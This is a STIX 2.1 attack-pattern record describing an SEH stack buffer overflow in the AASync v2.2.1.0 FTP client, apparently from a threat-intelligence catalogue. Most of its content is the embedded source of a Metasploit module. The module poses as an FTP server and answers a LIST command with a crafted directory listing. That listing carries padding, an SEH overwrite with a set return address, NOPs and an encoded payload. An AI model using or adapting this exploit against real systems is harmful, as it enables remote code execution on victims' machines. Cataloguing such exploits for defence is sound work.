{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--48a0eca9-74d6-4e40-9194-52f88304088f",
    "created": "2024-08-14T16:50:43.805163Z",
    "modified": "2024-08-14T16:50:43.805167Z",
    "name": "AASync v2.2.1.0 (Win32) Stack Buffer Overflow (LIST)",
    "description": " This module exploits a stack buffer overflow in AASync v2.2.1.0, triggered when processing the response on a LIST command. During the overflow, a structured exception handler record gets overwritten. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/ftp/aasync_list_reply.rb",
            "external_id": "aasync_list_reply.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.corelan.be:8800/index.php/2010/10/12/death-of-an-ftp-client/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::FtpServer\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'AASync v2.2.1.0 (Win32) Stack Buffer Overflow (LIST)',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in AASync v2.2.1.0, triggered when\n        processing the response on a LIST command. During the overflow, a structured exception\n        handler record gets overwritten.\n      },\n      'Author' \t =>\n        [\n          'corelanc0d3r <peter.ve[at]corelan.be>', #found bug and wrote the exploit\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'OSVDB', '68701' ],\n          [ 'EDB', '16738' ],\n          [ 'URL', 'http://www.corelan.be:8800/index.php/2010/10/12/death-of-an-ftp-client/' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x00\\xff\\x0d\\x5c\\x2f\\x0a\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'XP SP3 Universal', { 'Offset' => 6340,'Ret' => 0x61181674  } ],  # ppr [pthreadgc2.dll]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2010-10-12',\n      'DefaultTarget'  => 0))\n\n  end\n\n  #---------------------------------------------------------------------------------\n\n  def setup\n    super\n  end\n\n  def on_client_unknown_command(c,cmd,arg)\n    c.put(\"200 OK\\r\\n\")\n  end\n\n  def on_client_command_list(c,arg)\n      conn = establish_data_connection(c)\n      if(not conn)\n        c.put(\"425 Can't build data connection\\r\\n\")\n        return\n      end\n      print_status(\" - Data connection set up\")\n      code = 150\n      c.put(\"#{code} Here comes the directory listing.\\r\\n\")\n      code = 226\n      c.put(\"#{code} Directory send ok.\\r\\n\")\n      offset_to_nseh = target['Offset']\n      filename = \"admin passwords.txt\"\n      padding = \" \" * (offset_to_nseh-filename.length)\n      nseh = \"\\xeb\\x0c\\x41\\x41\"\n      seh = [target.ret].pack('V') #\\x74\\x16 = jump\n      nops = \"A\" * 30\n      junk2 = \"A\" * 5000\n      #dual offsets to seh\n      buffer = filename + padding + nseh + seh + seh + nops + payload.encoded + junk2\n      print_status(\" - Sending directory list via data connection\")\n      dirlist = \"-rw-rw-r--    1 1176     1176         1060 Aug 16 22:22 #{buffer}\\r\\n\"\n      conn.put(dirlist)\n      conn.close\n      print_status(\" - Payload sent\")\n      return\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-10-12",
    "x_mitre_platforms": [
        "win'"
    ]
}